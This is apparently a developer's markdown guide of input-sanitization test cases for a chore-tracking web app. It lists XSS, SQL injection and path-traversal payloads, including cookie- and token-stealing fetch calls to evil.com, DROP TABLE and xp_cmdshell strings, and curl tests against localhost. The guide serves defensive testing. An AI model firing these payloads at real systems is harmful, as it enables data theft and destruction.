# Dangerous Input Test Cases for ChoreBoard Application

## ⚠️ **WARNING**: Use these test cases ONLY in development/testing environments!

These test cases are designed to verify that your input sanitization is working correctly by attempting various attack vectors.

## 🔍 **XSS (Cross-Site Scripting) Test Cases**

### Basic XSS Attempts

```javascript
// Task descriptions
"<script>alert('XSS')</script>";
"<img src=x onerror=alert('XSS')>";
"<svg onload=alert('XSS')>";
"javascript:alert('XSS')";
"<iframe src=javascript:alert('XSS')></iframe>";
"<body onload=alert('XSS')>";
"<div onclick=alert('XSS')>Click me</div>";

// User names
"<script>document.location='http://evil.com'</script>";
"John<script>alert('XSS')</script>Doe";
"'; alert('XSS'); //";

// Project names
"Evil Project<script>window.location='http://malicious.com'</script>";
"<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>";
```

### Advanced XSS Attempts

```javascript
// Encoded XSS
"%3Cscript%3Ealert('XSS')%3C/script%3E";
"&lt;script&gt;alert('XSS')&lt;/script&gt;";
"<SCR\0IPT>alert('XSS')</SCR\0IPT>";

// Event handler injection
"onmouseover=alert('XSS')";
"onfocus=alert('XSS') autofocus";
"<input onfocus=alert('XSS') autofocus>";

// Data URI XSS
"data:text/html,<script>alert('XSS')</script>";
```

## 💉 **SQL Injection Test Cases**

### Basic SQL Injection

```sql
-- For search queries
"'; DROP TABLE task; --"
"' OR '1'='1"
"' UNION SELECT * FROM users --"
"'; DELETE FROM projects WHERE '1'='1'; --"

-- For ID fields (should be caught by UUID validation)
"1; DROP TABLE task; --"
"' OR 1=1 --"
"'; EXEC xp_cmdshell('dir'); --"

-- For numeric fields
"1 OR 1=1"
"1; DELETE FROM task; --"
```

### Advanced SQL Injection

```sql
-- Blind SQL injection
"' AND (SELECT COUNT(*) FROM users) > 0 --"
"' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE email='admin@test.com')='a' --"

-- Time-based SQL injection
"'; WAITFOR DELAY '00:00:05'; --"
"' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"
```

## 🔒 **Authentication Test Cases**

### Weak Passwords (Should be rejected)

```javascript
// Too short
"123";
"pass";

// Common patterns
"password";
"password123";
"123456789";
"qwerty123";
"admin123";

// No complexity
"alllowercase";
"ALLUPPERCASE";
"12345678";
"NoSpecial1";
```

### Malicious Email Addresses

```javascript
// XSS in email
"test+<script>alert('XSS')</script>@example.com";
"<script>alert('XSS')</script>@example.com";

// SQL injection in email
"test'; DROP TABLE users; --@example.com";
"admin'--@example.com";

// Invalid formats
"not-an-email";
"@example.com";
"test@";
"test..test@example.com";
```

## 📝 **Task Input Test Cases**

### Malicious Task Descriptions

```javascript
// XSS attempts
"<script>fetch('http://evil.com/steal-data?data='+document.cookie)</script>";
"<img src=x onerror=fetch('http://evil.com/log?'+btoa(localStorage.getItem('token')))>";

// HTML injection
"<h1>Fake Header</h1><p>This shouldn't render as HTML</p>";
"<style>body{display:none}</style>";

// Very long input (should be truncated)
"A".repeat(1000);

// Special characters
("Task with 'quotes' and \"double quotes\" and `backticks`");
("Task; with; semicolons; and; SQL; injection; attempts;");
```

### Invalid Dates and Times

```javascript
// Invalid dates
"2020-01-01"; // Past date (should be rejected)
"invalid-date";
"2025-13-45"; // Invalid month/day

// Invalid times
"25:00"; // Invalid hour
"12:60"; // Invalid minute
"not-a-time";
"12:30:45:99"; // Too many components
```

### Invalid Priorities

```javascript
// Should be normalized or rejected
"CRITICAL";
"super-high";
"0";
"low-medium";
"<script>alert('XSS')</script>";
```

## 🔍 **Search Query Test Cases**

### SQL Injection in Search

```javascript
"'; DROP TABLE task; SELECT * FROM users WHERE name LIKE '%";
"' UNION SELECT password FROM users WHERE '1'='1";
"\\'; DELETE FROM projects; --";
```

### XSS in Search

```javascript
"<script>alert('Searched XSS')</script>";
"<img src=x onerror=alert('Search XSS')>";
"javascript:alert('Search XSS')";
```

### Special Characters in Search

```javascript
"search term with 'quotes'";
"search; with; semicolons;";
"search\\with\\backslashes";
"search\"with\"quotes";
```

## 🆔 **ID Validation Test Cases**

### Invalid UUIDs

```javascript
// Malicious IDs
"'; DROP TABLE task; --";
"<script>alert('XSS')</script>";
"../../../etc/passwd";

// Invalid UUID formats
"not-a-uuid";
"123-456-789";
"00000000-0000-0000-0000-000000000000"; // Nil UUID
```

## 📊 **Pagination and Filtering Test Cases**

### Invalid Pagination

```javascript
// Negative values
{ page: -1, limit: -10 }

// Extremely large values
{ page: 999999, limit: 999999 }

// Non-numeric values
{ page: "'; DROP TABLE task; --", limit: "<script>alert('XSS')</script>" }
```

### Invalid Sorting

```javascript
// SQL injection in sort field
{ field: "name'; DROP TABLE task; --", direction: "asc" }

// XSS in sort direction
{ field: "name", direction: "<script>alert('XSS')</script>" }

// Invalid sort fields
{ field: "non_existent_field", direction: "asc" }
```

## 🧪 **Testing Methodology**

### Frontend Testing

```javascript
// Test in browser console
const testXSS = async () => {
  const maliciousInput = "<script>alert('XSS Test')</script>";

  try {
    // Test task creation
    await createNewTask({
      description: maliciousInput,
      priority: "high",
      projectId: "valid-uuid-here",
    });
  } catch (error) {
    console.log("✅ XSS blocked:", error.message);
  }
};

// Test SQL injection
const testSQLInjection = async () => {
  const maliciousSearch = "'; DROP TABLE task; --";

  try {
    // Test search functionality
    await searchTasks({ search: maliciousSearch });
  } catch (error) {
    console.log("✅ SQL Injection blocked:", error.message);
  }
};
```

### API Testing with curl

```bash
# Test XSS in task creation
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"description":"<script>alert(\"XSS\")</script>","priority":"high"}'

# Test SQL injection in search
curl -X GET "http://localhost:3000/api/tasks?search=%27%3B%20DROP%20TABLE%20task%3B%20--"

# Test invalid UUID
curl -X DELETE "http://localhost:3000/api/tasks/%27%3B%20DROP%20TABLE%20task%3B%20--"
```

## ✅ **Expected Results**

### Successful Sanitization Should:

1. **Block XSS**: Remove all script tags and event handlers
2. **Prevent SQL Injection**: Validate UUIDs and escape special characters
3. **Normalize Data**: Convert priorities to standard format
4. **Validate Lengths**: Enforce maximum length limits
5. **Sanitize HTML**: Remove all HTML tags from text inputs
6. **Validate Formats**: Ensure emails, dates, and times are valid

### Error Messages You Should See:

```
"Password must contain at least one uppercase letter"
"Invalid email address"
"Task description cannot exceed 500 characters"
"Invalid ID format"
"Search query contains invalid characters"
"Invalid priority filter"
```

## 🚨 **Security Checklist**

- [ ] XSS attempts are blocked in all text inputs
- [ ] SQL injection attempts are prevented
- [ ] Invalid UUIDs are rejected
- [ ] Password complexity is enforced
- [ ] Email validation works correctly
- [ ] Length limits are enforced
- [ ] HTML tags are stripped from inputs
- [ ] Search queries are sanitized
- [ ] Invalid dates/times are rejected
- [ ] Pagination limits are enforced

## 🔧 **Testing Tools**

### Browser Extensions

- **OWASP ZAP**: Automated security testing
- **Burp Suite**: Manual penetration testing
- **XSS Hunter**: XSS payload testing

### Manual Testing

1. Use browser developer tools
2. Test with Postman/Insomnia
3. Create automated test scripts
4. Use SQLMap for SQL injection testing

Remember: These tests should only be run in development environments to verify your security measures are working correctly!
